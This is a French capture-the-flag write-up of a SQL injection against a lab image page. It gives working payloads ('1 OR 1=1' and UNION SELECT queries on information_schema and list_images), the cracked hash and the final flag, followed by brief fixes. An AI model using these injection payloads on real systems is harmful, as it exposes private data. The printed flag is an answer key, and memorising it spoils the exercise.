# Recherches

1. Test de la requête `1 OR 1=1` dans l'input retourne toute la liste
2. Elément suspect `Hack me ?`
3. Lister les colonnes
   ```
   1 UNION SELECT TABLE_NAME, COLUMN_NAME FROM information_schema.columns
   ```
4. Afficher le contenu des autres colonnes
   ```
   1 UNION SELECT title, comment FROM list_images
   ```
5. `If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46`
6. `md5(1928e8083cf461a51303633093573c46) == "albatroz"`
7. `sha256(albatroz) = f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

> FLAG: f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

# Explications

Les failles sql sont courantes dans les applications qui ne sécurisent pas leurs entrées.

# Corrections

Pour éviter les failles sql plusieurs choses sont nécessaires:
     - mises à jour fréquentes de la db SQL
     - sanitize les entrées utilisateurs

